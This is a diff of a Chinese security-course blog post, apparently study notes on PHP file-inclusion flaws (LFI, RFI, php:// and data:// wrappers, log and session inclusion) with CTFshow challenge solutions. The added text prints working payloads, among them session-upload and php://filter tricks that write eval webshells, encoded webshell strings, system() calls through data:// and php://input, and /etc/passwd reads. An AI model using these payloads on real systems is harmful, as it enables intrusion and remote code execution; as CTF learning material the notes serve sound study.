@@ -22,17 +22,19 @@
     var CONFIG = {"hostname":"zhigao.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="正因为我有能力跨越，这个考验才会降临!">
-<meta property="og:type" content="article">
+  <meta property="og:type" content="article">
 <meta property="og:title" content="第69天-文件包含&amp;LFI&amp;RFI&amp;伪协议条件&amp;编码算法&amp;无文件利用&amp;JAVA应用&amp;SRC复盘">
 <meta property="og:url" content="http://zhigao.xyz/2026/09/10/%E7%AC%AC69%E5%A4%A9-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A1%E4%BB%B6-%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-JAVA%E5%BA%94%E7%94%A8-SRC%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="Voyage Memo">
-<meta property="og:description" content="正因为我有能力跨越，这个考验才会降临!">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://zhigao.xyz/images/069-1.png">
+<meta property="og:image" content="http://zhigao.xyz/images/069-2.png">
 <meta property="article:published_time" content="2026-09-10T08:04:09.000Z">
-<meta property="article:modified_time" content="2026-09-10T08:04:09.582Z">
+<meta property="article:modified_time" content="2026-09-15T15:11:55.315Z">
 <meta property="article:author" content="智高">
+<meta property="article:tag" content="笔记">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zhigao.xyz/images/069-1.png">
 
 <link rel="canonical" href="http://zhigao.xyz/2026/09/10/%E7%AC%AC69%E5%A4%A9-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-LFI-RFI-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%9D%A1%E4%BB%B6-%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95-%E6%97%A0%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8-JAVA%E5%BA%94%E7%94%A8-SRC%E5%A4%8D%E7%9B%98/">
 
@@ -215,6 +217,22 @@
 
               <time title="创建时间：2026-09-10 16:04:09" itemprop="dateCreated datePublished" datetime="2026-09-10T16:04:09+08:00">2026-09-10</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2026-09-15 23:11:55" itemprop="dateModified" datetime="2026-09-15T23:11:55+08:00">2026-09-15</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-web%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">小迪安全课程学习笔记(web攻防)</span></a>
+                </span>
+            </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -234,7 +252,133 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <p><font></font></p>
+<span id="more"></span>
+
+
+
+
+<p><font style="color:#ff0000;background-color:#ffff00;">演示案例：</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢</font><font style="color:#ff0000;background-color:#ffffff;"> </font><font style="color:#ff0000;background-color:#ffffff;">WEB攻防-文件包含-LFI&amp;RFI&amp;伪协议&amp;无文件</font></p>
+<p><font style="color:#ff0000;background-color:#ffffff;">➢ WEB攻防-文件包含-PHP&amp;JAVA&amp;SRC复盘</font></p>
+<h1 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a><font style="color:#000000;">一、漏洞原理</font></h1><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程一般被称为文件包含。在包含文件的过程中，如果文件能进行控制，则存在文件包含漏洞</p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="background-color:#FBDE28;">安全写法：include(“路径”)</font></p>
+<p><font style="background-color:#FBDE28;">不安全写法：include($_GET[‘file’])</font></p>
+<p><font style="background-color:#FBDE28;">我们能控制那就存在漏洞</font></p>
+<h1 id="二、分类"><a href="#二、分类" class="headerlink" title="二、分类"></a><font style="color:#000000;">二、分类</font></h1><h2 id="1、本地包含-Local-File-Include-LFI"><a href="#1、本地包含-Local-File-Include-LFI" class="headerlink" title="1、本地包含-Local File Include-LFI"></a><font style="color:#000000;">1、本地包含-Local File Include-LFI</font></h2><p>?file&#x3D;1.txt</p>
+<p><font style="background-color:#FBDE28;">利用：</font></p>
+<p><font style="background-color:#FBDE28;">有文件利用：上传一个文件，文件带有我们写的恶意代码（配合上传）</font></p>
+<p><font style="background-color:#FBDE28;">无文件利用：</font></p>
+<p><font style="background-color:#FBDE28;">1、包含日志文件利用（CTFSHOW 81.81）</font></p>
+<p><font style="background-color:#FBDE28;">php和data被过滤，只剩file能用但是要完整路径，所以去找日志文件路径，发现会记录我的ua信息，所以我们发包，在ua那里上传后门或命令执行，日志本身不能执行代码，是因为include函数把日志中的php代码执行了</font></p>
+<p><font style="background-color:#FBDE28;">2、包含Session文件利用（CTFSHOW82-86）</font></p>
+<p>:::info<br><!DOCTYPE html>  </p>
+<html>  
+<body>  
+<form action="http://xxxx.ctf.show/" method="POST" enctype="multipart/form-data">  
+<!-- 向SESSION写入Webshell代码 -->  
+<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>')?>" />  
+<input type="file" name="file" />  
+<input type="submit" value="submit" />  
+</form>  
+</body>  
+</html>  
+这是一个上传文件的网页，上传一个文件后自动生成一个Session，Session里面写<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>')?>" />后面value值，也就是木马，但是文件上传后就会自动删除，所以要结合条件竞争，我们抓包然后Sessionid自定义，然后疯狂发包，然后访问这个Session路径疯狂发包，
+
+<p>:::</p>
+<p><font style="background-color:#FBDE28;">3、伪协议玩法利用</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/069-1.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/069-2.png"></p>
+<p><font style="background-color:#FBDE28;">文件读取：</font></p>
+<p><font style="background-color:#FBDE28;">file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd需要绝对路径</font></p>
+<p><font style="background-color:#FBDE28;">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;相对路径</font></p>
+<p><font style="background-color:#FBDE28;">文件写入：</font></p>
+<p><font style="background-color:#FBDE28;">php:&#x2F;&#x2F;input POST:<?php fputs(fopen('shell.php','w'),'<?php @eval()$_GET[cmd];?>‘)?&gt;</font></p>
+<p><font style="background-color:#FBDE28;">php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-encode&#x2F;resource&#x3D;相对路径</font></p>
+<p><font style="background-color:#FBDE28;">代码执行：</font></p>
+<p><font style="background-color:#FBDE28;">php:&#x2F;&#x2F;input POST:<?php phpinfo();?></font></p>
+<p><font style="background-color:#FBDE28;">data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo();?></font></p>
+<p><font style="background-color:#FBDE28;">data:&#x2F;&#x2F;text&#x2F;plain;base64,<?php phpinfo();?>加密字符串</font></p>
+<h2 id="2、远程包含-remote-file-include-RFI"><a href="#2、远程包含-remote-file-include-RFI" class="headerlink" title="2、远程包含-remote file include RFI"></a>2、远程包含-remote file include RFI</h2><p>allow_url_include开关必须是开的，但是PHP高版本默认关闭</p>
+<p>?file&#x3D;<a target="_blank" rel="noopener" href="https://xiaodi8.com/">https://xiaodi8.com</a></p>
+<p>直接搭建一个可访问的远程url包含文件</p>
+<p><font style="color:#000000;">差异原因：代码过滤和环境配置文件开关决定</font></p>
+<p><font style="color:#000000;"></font></p>
+<h1 id="三、白盒审计：（CTFSHOW）"><a href="#三、白盒审计：（CTFSHOW）" class="headerlink" title="三、白盒审计：（CTFSHOW）"></a><font style="color:#000000;">三、白盒审计：（CTFSHOW）</font></h1><p><font style="color:#000000;">-白盒发现：</font></p>
+<p><font style="color:#000000;">1</font><font style="color:#000000;">、可通过应用功能追踪代码定位审计</font></p>
+<p><font style="color:#000000;">2</font><font style="color:#000000;">、可通过脚本特定函数搜索定位审计</font></p>
+<p><font style="color:#000000;">3</font><font style="color:#000000;">、可通过伪协议玩法绕过相关修复等</font></p>
+<p><font style="color:#000000;">PHP：include、require、include_once、require_once等</font></p>
+<p><font style="color:#000000;">include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</font></p>
+<p><font style="color:#000000;">require函数出现错误的时候，会直接报错并退出程序的执行</font></p>
+<p><font style="color:#000000;">Java：java.io.File、java.io.FileReader等</font></p>
+<p><font style="color:#000000;">ASP.NET：System.IO.FileStream、System.IO.StreamReader等</font></p>
+<p><font style="color:#000000;">3</font><font style="color:#000000;">、黑盒分析：</font></p>
+<p><font style="color:#000000;">-黑盒发现：主要观察参数传递的数据和文件名是否对应</font></p>
+<p><font style="color:#000000;">URL中有path、dir、file、page、archive、eng、语言文件等相关字眼</font></p>
+<h1 id="四、CTF题"><a href="#四、CTF题" class="headerlink" title="四、CTF题"></a><font style="color:#000000;">四、CTF题</font></h1><p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://ctf.show/challenges">https://ctf.show/challenges</a></font></p>
+<p><font style="color:#000000;">78</font><font style="color:#000000;">-php</font><font style="color:#000000;">&amp;</font><font style="color:#000000;">http协议</font></p>
+<p><font style="color:#000000;">payload:?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">php:&#x2F;&#x2F;filter&#x2F;read</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">convert.base64-encode&#x2F;resource</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">flag.php</font></p>
+<p><font style="color:#000000;">payload: ?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">php:&#x2F;&#x2F;input post:</font><font style="color:#000000;">&lt;</font><font style="color:#000000;">?php system</font><font style="color:#000000;">(</font><font style="color:#000000;">‘tac flag.php’</font><font style="color:#000000;">);</font><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">payload: ?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> </font><font style="color:#000000;">1</font><font style="color:#000000;">.txt:</font><font style="color:#000000;">&lt;</font><font style="color:#000000;">?php system</font><font style="color:#000000;">(</font><font style="color:#000000;">‘tac flag.php’</font><font style="color:#000000;">);</font><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">79</font><font style="color:#000000;">-data</font><font style="color:#000000;">&amp;</font><font style="color:#000000;">http协议</font></p>
+<p><font style="color:#000000;">payload: ?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">data:&#x2F;&#x2F;text&#x2F;plain,</font><font style="color:#000000;">&lt;</font><font style="color:#000000;">?</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">system</font><font style="color:#000000;">(</font><font style="color:#000000;">‘tac flag.*’</font><font style="color:#000000;">);</font><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">payload:?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">data:&#x2F;&#x2F;text&#x2F;plain</font><font style="color:#000000;">;</font><font style="color:#000000;">base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs&#x2F;Pg</font><font style="color:#000000;">&#x3D;&#x3D;</font></p>
+<p><font style="color:#000000;">payload: ?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;"><a target="_blank" rel="noopener" href="http://www.xiaodi8.com/1.txt">http://www.xiaodi8.com/1.txt</a> </font><font style="color:#000000;">1</font><font style="color:#000000;">.txt:</font><font style="color:#000000;">&lt;</font><font style="color:#000000;">?php system</font><font style="color:#000000;">(</font><font style="color:#000000;">‘tac flag.php’</font><font style="color:#000000;">);</font><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">80</font><font style="color:#000000;">81</font><font style="color:#000000;">-日志包含</font></p>
+<p><font style="color:#000000;">1</font><font style="color:#000000;">、利用其他协议,如file,zlib等</font></p>
+<p><font style="color:#000000;">2</font><font style="color:#000000;">、利用日志记录UA特性包含执行</font></p>
+<p><font style="color:#000000;">分析需文件名及带有php关键字放弃</font></p>
+<p><font style="color:#000000;">故利用日志记录UA信息，UA带入代码</font></p>
+<p><font style="color:#000000;">包含：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">82</font><font style="color:#000000;">-86-</font><font style="color:#000000;">SESSION</font><font style="color:#000000;">包含</font></p>
+<p><font style="color:#000000;">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</font></p>
+<p><font style="color:#000000;">自定义session名字，条件竞争访问session文件，触发创建新文件</font></p>
+<p><font style="color:#000000;">&lt;!</font><font style="color:#000000;">DOCTYPE html</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">html</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">body</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">form </font><font style="color:#000000;">action</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“<a target="_blank" rel="noopener" href="http://xxxx.ctf.show/">http://xxxx.ctf.show/</a>“</font><font style="color:#000000;">method</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“POST”</font><font style="color:#000000;">enctype</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“multipart&#x2F;form-data”</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">input </font><font style="color:#000000;">type</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“hidden”</font><font style="color:#000000;">name</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“PHP_SESSION_UPLOAD_PROGRESS”</font><font style="color:#000000;">value</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[1])?>‘?&gt;”</font><font style="color:#000000;"> &#x2F;</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">input </font><font style="color:#000000;">type</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“file”</font><font style="color:#000000;">name</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“file”</font><font style="color:#000000;"> &#x2F;</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">input </font><font style="color:#000000;">type</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“submit”</font><font style="color:#000000;">value</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">“submit”</font><font style="color:#000000;"> &#x2F;</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">&#x2F;form</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">&#x2F;body</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">&#x2F;html</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lnterpreter/p/14086164.html">https://www.cnblogs.com/lnterpreter/p/14086164.html</a></font></p>
+<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://www.cnblogs.com/echoDetected/p/13976405.html">https://www.cnblogs.com/echoDetected/p/13976405.html</a></font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">87</font><font style="color:#000000;">-php:&#x2F;&#x2F;filter&#x2F;write</font><font style="color:#000000;">&amp;</font><font style="color:#000000;">加密编码</font></p>
+<p><font style="color:#000000;">1</font><font style="color:#000000;">、利用base64:</font></p>
+<p><font style="color:#000000;">url编码2次：php:&#x2F;&#x2F;filter&#x2F;write</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">convert.base64-decode&#x2F;resource</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">123</font><font style="color:#000000;">.php </font></p>
+<p><font style="color:#000000;">content</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg</font><font style="color:#000000;">&#x3D;&#x3D;</font></p>
+<p><font style="color:#000000;">2</font><font style="color:#000000;">、利用凯撒13：</font></p>
+<p><font style="color:#000000;">url编码2次：php:&#x2F;&#x2F;filter&#x2F;write</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">string.rot13&#x2F;resource</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">2</font><font style="color:#000000;">.php</font></p>
+<p><font style="color:#000000;">content</font><font style="color:#000000;">&#x3D;&lt;</font><font style="color:#000000;">?cuc riny</font><font style="color:#000000;">(</font><font style="color:#000000;">$_CBFG</font><font style="color:#000000;">[</font><font style="color:#000000;">1</font><font style="color:#000000;">]);</font><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">88</font><font style="color:#000000;">-data</font><font style="color:#000000;">&amp;</font><font style="color:#000000;">base64协议</font></p>
+<p><font style="color:#000000;">过滤PHP，各种符号，php代码编码写出无符号base64值</font></p>
+<p><font style="color:#000000;">Payload：file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">data:&#x2F;&#x2F;text&#x2F;plain</font><font style="color:#000000;">;</font><font style="color:#000000;">base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs&#x2F;PmFk</font></p>
+<p><font style="color:#000000;"></font></p>
+<p><font style="color:#000000;">117</font><font style="color:#000000;">-php:&#x2F;&#x2F;filter&#x2F;write</font><font style="color:#000000;">&amp;</font><font style="color:#000000;">新的算法</font></p>
+<p><font style="color:#000000;">convert.iconv.：一种过滤器，和使用iconv</font><font style="color:#000000;">()</font><font style="color:#000000;">函数处理流数据有等同作用</font></p>
+<p><font style="color:#000000;">&lt;</font><font style="color:#000000;">?php</font></p>
+<p><font style="color:#000000;">$result</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;"> iconv</font><font style="color:#000000;">(</font><font style="color:#000000;">“UCS-2LE”</font><font style="color:#000000;">,</font><font style="color:#000000;">“UCS-2BE”</font><font style="color:#000000;">, </font><font style="color:#000000;">‘<?php eval($_POST[a]);?>‘</font><font style="color:#000000;">);</font></p>
+<p><font style="color:#000000;">echo</font><font style="color:#000000;">“经过一次反转:”</font><font style="color:#000000;">.</font><font style="color:#000000;">$result</font><font style="color:#000000;">.</font><font style="color:#000000;">“\n”</font><font style="color:#000000;">;</font></p>
+<p><font style="color:#000000;">echo</font><font style="color:#000000;">“经过第二次反转:”</font><font style="color:#000000;">.iconv</font><font style="color:#000000;">(</font><font style="color:#000000;">“UCS-2LE”</font><font style="color:#000000;">,</font><font style="color:#000000;">“UCS-2BE”</font><font style="color:#000000;">, </font><font style="color:#000000;">$result</font><font style="color:#000000;">);</font></p>
+<p><font style="color:#000000;">?</font><font style="color:#000000;">&gt;</font></p>
+<p><font style="color:#000000;">Payload：?file</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">php:&#x2F;&#x2F;filter&#x2F;write</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">a.php</font></p>
+<p><font style="color:#000000;">contents</font><font style="color:#000000;">&#x3D;</font><font style="color:#000000;">?</font><font style="color:#000000;">&lt;</font><font style="color:#000000;">hp pvela</font><font style="color:#000000;">$(P_SO[T]a;)</font><font style="color:#000000;">&gt;</font><font style="color:#000000;">?</font></p>
+<p><font style="color:#000000;"></font></p>
+<h1 id="五、实战方向："><a href="#五、实战方向：" class="headerlink" title="五、实战方向："></a><font style="color:#000000;">五、实战方向：</font></h1><p><font style="color:#000000;">SRC复盘报告</font></p>
+<p><font style="color:#000000;"><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hMUDDgRSPY6ybznYBRZ20Q">https://mp.weixin.qq.com/s/hMUDDgRSPY6ybznYBRZ20Q</a></font></p>
+<p><font style="color:#000000;"></font></p>
+
     </div>
 
     
@@ -242,6 +386,9 @@
     
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
+          </div>
 
         
 
@@ -252,7 +399,10 @@
     <a href="/2026/09/10/%E7%AC%AC67-68%E5%A4%A9-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95-MIME-JS%E6%B3%84%E9%9C%B2-%E6%89%A7%E8%A1%8C%E6%9D%83%E9%99%90-%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90-OSS%E5%AD%98%E5%82%A8-%E5%88%86%E5%9F%9F%E5%90%8D-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89-JS%E6%B3%84%E9%9C%B2-%E5%BC%80%E6%BA%90%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E-%E7%BC%96%E8%BE%91%E5%99%A8%E5%AE%89%E5%85%A8-%E6%80%9D%E7%BB%B4%E4%BD%93%E7%B3%BB-SRC%E5%A4%8D%E7%9B%98/" rel="prev" title="第67&68天-文件上传&黑白名单&MIME&JS泄露&执行权限&编码解析&OSS存储&分域名&条件竞争&JS泄露&开源审计漏洞&编辑器安全&思维体系&SRC复盘">
       <i class="fa fa-chevron-left"></i> 第67&68天-文件上传&黑白名单&MIME&JS泄露&执行权限&编码解析&OSS存储&分域名&条件竞争&JS泄露&开源审计漏洞&编辑器安全&思维体系&SRC复盘
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2026/09/15/%E7%AC%AC70%E5%A4%A9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4-%E7%B4%A2%E5%BC%95%E6%B3%84%E9%9C%B2-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-SRC%E5%A4%8D%E7%9B%98/" rel="next" title="第70天-任意文件下载&文件读取&文件删除&索引泄露&目录遍历&路径穿越&SRC复盘">
+      第70天-任意文件下载&文件读取&文件删除&索引泄露&目录遍历&路径穿越&SRC复盘 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -320,6 +470,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">一、漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%88%86%E7%B1%BB"><span class="nav-number">2.</span> <span class="nav-text">二、分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB-Local-File-Include-LFI"><span class="nav-number">2.1.</span> <span class="nav-text">1、本地包含-Local File Include-LFI</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB-remote-file-include-RFI"><span class="nav-number">2.2.</span> <span class="nav-text">2、远程包含-remote file include RFI</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%EF%BC%9A%EF%BC%88CTFSHOW%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">三、白盒审计：（CTFSHOW）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81CTF%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">四、CTF题</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E5%AE%9E%E6%88%98%E6%96%B9%E5%90%91%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">五、实战方向：</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -335,7 +486,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">43</span>
+          <span class="site-state-item-count">45</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
